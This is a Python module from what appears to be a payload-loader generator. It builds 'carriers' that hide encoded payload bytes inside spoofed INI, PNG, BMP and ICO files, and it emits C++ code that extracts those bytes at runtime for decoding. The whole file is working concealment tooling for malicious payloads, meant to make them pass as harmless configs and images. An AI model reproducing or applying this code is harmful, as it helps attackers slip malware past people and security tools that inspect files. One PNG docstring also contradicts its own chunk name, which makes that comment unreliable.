"""
External payload carriers.

A carrier wraps the encoded+enveloped payload bytes inside a file that
*looks* like something innocuous (INI config, PNG image, BMP image, ICO
icon) and emits C++ that reads the file at runtime and extracts the
original bytes — feeding straight into the existing envelope-decode /
encoder-inverse pipeline.

Each carrier defines two halves:

    wrap(payload_bytes) -> file_bytes        # Python, build time
    cpp_load_template (Python str)           # emitted into the C++ output

The C++ template runs at process start and produces, at file scope:

    unsigned char* enc_buf       (when the envelope is 'none')
    unsigned int   enc_len
        — OR —
    const char*    code_blob_text
    unsigned int   code_blob_text_len

…depending on whether an envelope is in use. The downstream envelope
decode and encoder inverse run on those names unchanged, so adding a
carrier is transparent to the rest of the generator.
"""
from __future__ import annotations

import base64
import os
import struct
import zlib
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional


# ─────────────────────────────────────────────────────────────────────
#  Python-side wrap functions
# ─────────────────────────────────────────────────────────────────────

def _wrap_ini(payload: bytes, *, marker: str = "data") -> bytes:
    """Wrap payload as base64 inside a fake [Settings] INI block.

    The marker key (default ``data``) is what the C++ loader greps for.
    """
    b64 = base64.b64encode(payload).decode("ascii")
    return (
        "; Application configuration\n"
        "; Auto-generated; do not edit.\n"
        "[Settings]\n"
        "version=1.0\n"
        "enabled=true\n"
        f"{marker}={b64}\n"
        "checksum=0\n"
    ).encode("utf-8")


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    """Build a single PNG chunk (length + type + data + CRC32)."""
    if len(chunk_type) != 4:
        raise ValueError("PNG chunk type must be exactly 4 bytes")
    payload = chunk_type + data
    crc = zlib.crc32(payload) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + payload + struct.pack(">I", crc)


def _wrap_png(payload: bytes, *, chunk_type: bytes = b"wMpL") -> bytes:
    """Wrap payload as a custom ancillary chunk inside a valid 1x1 PNG.

    PNG chunk-type convention: first byte lowercase ⇒ ancillary
    (decoders ignore unknown ancillary chunks), second lowercase ⇒
    private (not registered), third uppercase ⇒ reserved, fourth
    uppercase ⇒ safe-to-copy = no. The default ``wMpL`` satisfies all
    four and is highly unlikely to clash with any real PNG decoder.
    """
    sig = bytes((0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A))
    # 1x1 grayscale, 8-bit depth
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
    # 1 pixel of compressed grayscale data
    idat_raw = b"\x00\x00"  # filter byte + pixel
    idat = zlib.compress(idat_raw)
    return (
        sig
        + _png_chunk(b"IHDR", ihdr)
        + _png_chunk(chunk_type, payload)
        + _png_chunk(b"IDAT", idat)
        + _png_chunk(b"IEND", b"")
    )


def _wrap_bmp(payload: bytes) -> bytes:
    """Wrap payload after the pixel data of a 1x1 24-bit BMP.

    BMP readers stop at the pixel-data row × stride boundary declared in
    the header, so any bytes that follow are silently ignored — making
    the BMP the simplest container that still looks like a real image.
    """
    pixel_data = b"\x00\x00\x00\x00"  # 1 BGR pixel (3 bytes) + row pad to 4
    bitmap_info_header = struct.pack(
        "<IiiHHIIiiII",
        40,             # biSize
        1, 1,           # width, height
        1,              # planes
        24,             # bpp
        0,              # compression (BI_RGB)
        len(pixel_data),
        2835, 2835,     # x/y pixels-per-meter (~72 dpi)
        0, 0,           # colors used / important
    )
    pixel_offset = 14 + len(bitmap_info_header)
    total_size = pixel_offset + len(pixel_data) + len(payload)
    file_header = struct.pack("<2sIHHI", b"BM", total_size, 0, 0, pixel_offset)
    return file_header + bitmap_info_header + pixel_data + payload


def _wrap_ico(payload: bytes) -> bytes:
    """Wrap payload after the icon directory of a 1×1 ICO.

    The single entry points at a tiny ARGB bitmap; the payload bytes are
    appended after that bitmap. Most icon readers stop at the declared
    bitmap size, so the trailing payload is ignored.
    """
    # Minimum bitmap: BITMAPINFOHEADER (40 bytes) + 1 ARGB pixel (4 bytes)
    bitmap_info = struct.pack(
        "<IiiHHIIiiII",
        40, 1, 2, 1, 32, 0, 4, 2835, 2835, 0, 0,
    )
    bitmap_data = b"\x00\x00\x00\xFF"
    bitmap = bitmap_info + bitmap_data
    icon_offset = 6 + 16  # ICONDIR + 1 ICONDIRENTRY
    entry = struct.pack(
        "<BBBBHHII",
        1, 1, 0, 0, 1, 32, len(bitmap), icon_offset,
    )
    icon_dir = struct.pack("<HHH", 0, 1, 1)
    return icon_dir + entry + bitmap + payload


# ─────────────────────────────────────────────────────────────────────
#  C++ load snippets
# ─────────────────────────────────────────────────────────────────────

_CPP_COMMON_INCLUDES = """\
#include <cstdint>
#include <fstream>
#include <sstream>
#include <stdexcept>
#include <string>
#include <vector>
"""


_CPP_LOAD_INI = """\
// Carrier: INI — payload base64-encoded under [Settings] data=…
std::ifstream {fh}({carrier_path_expr}, std::ios::binary);
if (!{fh}) throw std::runtime_error("Cannot open carrier file");
std::stringstream {sbuf};
{sbuf} << {fh}.rdbuf();
std::string {text} = {sbuf}.str();
const std::string {marker_var} = "data=";
size_t {start} = {text}.find({marker_var});
if ({start} == std::string::npos) throw std::runtime_error("Carrier marker missing");
{start} += {marker_var}.size();
size_t {end} = {text}.find('\\n', {start});
if ({end} == std::string::npos) {end} = {text}.size();
std::string {b64} = {text}.substr({start}, {end} - {start});
// Inline base64 decode -> raw payload bytes
int {b64dec}[256]; for (int i=0;i<256;++i) {b64dec}[i] = -1;
{{
    const char* {alpha_var} = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i=0;i<64;++i) {b64dec}[(unsigned char){alpha_var}[i]] = i;
}}
std::vector<unsigned char> {carrier_out};
{carrier_out}.reserve(({b64}.size() * 3u) / 4u + 3u);
{{
    unsigned int {val} = 0; int {valb} = -8;
    for (size_t i = 0; i < {b64}.size(); ++i) {{
        int {d} = {b64dec}[(unsigned char){b64}[i]];
        if ({d} == -1) continue;
        {val} = ({val} << 6) | (unsigned){d}; {valb} += 6;
        if ({valb} >= 0) {{
            {carrier_out}.push_back((unsigned char)(({val} >> {valb}) & 0xFFu));
            {valb} -= 8;
        }}
    }}
}}
"""


_CPP_LOAD_PNG = """\
// Carrier: PNG — payload in custom ancillary chunk
std::ifstream {fh}({carrier_path_expr}, std::ios::binary);
if (!{fh}) throw std::runtime_error("Cannot open carrier file");
std::vector<unsigned char> {raw}((std::istreambuf_iterator<char>({fh})), {{}});
if ({raw}.size() < 8 || {raw}[0] != 0x89 || {raw}[1] != 0x50 || {raw}[2] != 0x4E || {raw}[3] != 0x47)
    throw std::runtime_error("Carrier is not a PNG");
const unsigned char {target_type}[4] = {{ {chunk_b0}, {chunk_b1}, {chunk_b2}, {chunk_b3} }};
std::vector<unsigned char> {carrier_out};
size_t {pos} = 8;
while ({pos} + 12 <= {raw}.size()) {{
    uint32_t {len} = (uint32_t({raw}[{pos}]) << 24) | (uint32_t({raw}[{pos}+1]) << 16)
                   | (uint32_t({raw}[{pos}+2]) << 8)  |  uint32_t({raw}[{pos}+3]);
    bool {match} = ({raw}[{pos}+4] == {target_type}[0]) && ({raw}[{pos}+5] == {target_type}[1])
                 && ({raw}[{pos}+6] == {target_type}[2]) && ({raw}[{pos}+7] == {target_type}[3]);
    if ({match}) {{
        if ({pos} + 8 + {len} > {raw}.size()) throw std::runtime_error("Truncated carrier chunk");
        {carrier_out}.assign({raw}.begin() + {pos} + 8, {raw}.begin() + {pos} + 8 + {len});
        break;
    }}
    {pos} += 12 + {len};
}}
if ({carrier_out}.empty()) throw std::runtime_error("Carrier payload chunk not found");
"""


_CPP_LOAD_BMP = """\
// Carrier: BMP — payload appended after declared pixel-data length
std::ifstream {fh}({carrier_path_expr}, std::ios::binary);
if (!{fh}) throw std::runtime_error("Cannot open carrier file");
std::vector<unsigned char> {raw}((std::istreambuf_iterator<char>({fh})), {{}});
if ({raw}.size() < 54 || {raw}[0] != 'B' || {raw}[1] != 'M')
    throw std::runtime_error("Carrier is not a BMP");
uint32_t {pixoff} = uint32_t({raw}[10]) | (uint32_t({raw}[11]) << 8)
                  | (uint32_t({raw}[12]) << 16) | (uint32_t({raw}[13]) << 24);
uint32_t {pixsz}  = uint32_t({raw}[34]) | (uint32_t({raw}[35]) << 8)
                  | (uint32_t({raw}[36]) << 16) | (uint32_t({raw}[37]) << 24);
size_t {payload_off} = {pixoff} + {pixsz};
if ({payload_off} > {raw}.size()) throw std::runtime_error("Truncated BMP carrier");
std::vector<unsigned char> {carrier_out}({raw}.begin() + {payload_off}, {raw}.end());
if ({carrier_out}.empty()) throw std::runtime_error("BMP carrier has no trailing payload");
"""


_CPP_LOAD_ICO = """\
// Carrier: ICO — payload appended after declared bitmap data
std::ifstream {fh}({carrier_path_expr}, std::ios::binary);
if (!{fh}) throw std::runtime_error("Cannot open carrier file");
std::vector<unsigned char> {raw}((std::istreambuf_iterator<char>({fh})), {{}});
if ({raw}.size() < 22 || {raw}[0] != 0 || {raw}[1] != 0 || {raw}[2] != 1 || {raw}[3] != 0)
    throw std::runtime_error("Carrier is not an ICO");
uint32_t {imgsz}  = uint32_t({raw}[14]) | (uint32_t({raw}[15]) << 8)
                  | (uint32_t({raw}[16]) << 16) | (uint32_t({raw}[17]) << 24);
uint32_t {imgoff} = uint32_t({raw}[18]) | (uint32_t({raw}[19]) << 8)
                  | (uint32_t({raw}[20]) << 16) | (uint32_t({raw}[21]) << 24);
size_t {payload_off} = {imgoff} + {imgsz};
if ({payload_off} > {raw}.size()) throw std::runtime_error("Truncated ICO carrier");
std::vector<unsigned char> {carrier_out}({raw}.begin() + {payload_off}, {raw}.end());
if ({carrier_out}.empty()) throw std::runtime_error("ICO carrier has no trailing payload");
"""


# ─────────────────────────────────────────────────────────────────────
#  Registry
# ─────────────────────────────────────────────────────────────────────

@dataclass(frozen=True)
class Carrier:
    """Static metadata + wrap fn + C++ template for one carrier format."""
    index: int
    name: str
    extension: str
    description: str
    wrap: Callable[[bytes], bytes]
    cpp_includes: str
    cpp_load_template: str
    cpp_extra_fields: Dict[str, str]


# Bag of helpers that don't depend on per-run randomness — assembled
# into a fresh template-rendering context per call so symbol naming
# stays consistent within one generated file.
def _render(template: str, *, carrier_out: str, carrier_path_expr: str, **extras) -> str:
    """Fill a carrier's C++ template with the per-run identifiers."""
    return template.format(
        carrier_out=carrier_out,
        carrier_path_expr=carrier_path_expr,
        fh=f"__{carrier_out}_fh",
        raw=f"__{carrier_out}_raw",
        text=f"__{carrier_out}_text",
        sbuf=f"__{carrier_out}_sbuf",
        b64=f"__{carrier_out}_b64",
        b64dec=f"__{carrier_out}_b64dec",
        alpha_var=f"__{carrier_out}_alpha",
        marker_var=f"__{carrier_out}_marker",
        target_type=f"__{carrier_out}_type",
        match=f"__{carrier_out}_match",
        pos=f"__{carrier_out}_pos",
        len=f"__{carrier_out}_len",
        start=f"__{carrier_out}_start",
        end=f"__{carrier_out}_end",
        val=f"__{carrier_out}_val",
        valb=f"__{carrier_out}_valb",
        d=f"__{carrier_out}_d",
        pixoff=f"__{carrier_out}_pixoff",
        pixsz=f"__{carrier_out}_pixsz",
        imgsz=f"__{carrier_out}_imgsz",
        imgoff=f"__{carrier_out}_imgoff",
        payload_off=f"__{carrier_out}_payload_off",
        **extras,
    )


CARRIERS: List[Carrier] = [
    Carrier(
        index=0, name="ini", extension="ini",
        description="Spoof as Windows INI; payload base64-encoded in [Settings] data=",
        wrap=_wrap_ini,
        cpp_includes=_CPP_COMMON_INCLUDES,
        cpp_load_template=_CPP_LOAD_INI,
        cpp_extra_fields={},
    ),
    Carrier(
        index=1, name="png", extension="png",
        description="Spoof as 1x1 PNG; payload stored in custom ancillary chunk",
        wrap=_wrap_png,
        cpp_includes=_CPP_COMMON_INCLUDES,
        cpp_load_template=_CPP_LOAD_PNG,
        cpp_extra_fields={
            # Custom ancillary chunk type bytes — matched at runtime.
            "chunk_b0": "0x77", "chunk_b1": "0x4D",
            "chunk_b2": "0x70", "chunk_b3": "0x4C",
        },
    ),
    Carrier(
        index=2, name="bmp", extension="bmp",
        description="Spoof as 1x1 BMP; payload appended after declared pixel block",
        wrap=_wrap_bmp,
        cpp_includes=_CPP_COMMON_INCLUDES,
        cpp_load_template=_CPP_LOAD_BMP,
        cpp_extra_fields={},
    ),
    Carrier(
        index=3, name="ico", extension="ico",
        description="Spoof as 1x1 ICO; payload appended after declared bitmap block",
        wrap=_wrap_ico,
        cpp_includes=_CPP_COMMON_INCLUDES,
        cpp_load_template=_CPP_LOAD_ICO,
        cpp_extra_fields={},
    ),
]

CARRIERS_BY_INDEX: Dict[int, Carrier] = {c.index: c for c in CARRIERS}
CARRIERS_BY_NAME: Dict[str, Carrier] = {c.name: c for c in CARRIERS}


def get_carrier(key) -> Carrier:
    """Resolve a carrier by integer index or string name. Raises on miss."""
    if isinstance(key, int):
        if key not in CARRIERS_BY_INDEX:
            raise ValueError(f"Unknown carrier index {key}")
        return CARRIERS_BY_INDEX[key]
    if isinstance(key, str):
        name = key.lower().strip()
        if name not in CARRIERS_BY_NAME:
            raise ValueError(f"Unknown carrier '{key}'")
        return CARRIERS_BY_NAME[name]
    raise TypeError("Carrier key must be int index or str name")


def list_carriers() -> List[Dict[str, object]]:
    """Playbook-style listing for CLI --help output."""
    return [
        {
            "index": c.index, "name": c.name,
            "extension": c.extension, "desc": c.description,
        }
        for c in CARRIERS
    ]


def render_carrier_cpp(carrier: Carrier, carrier_out_var: str, carrier_path_expr: str) -> str:
    """Render a carrier's C++ load block targeting the named output vector."""
    return _render(
        carrier.cpp_load_template,
        carrier_out=carrier_out_var,
        carrier_path_expr=carrier_path_expr,
        **carrier.cpp_extra_fields,
    )
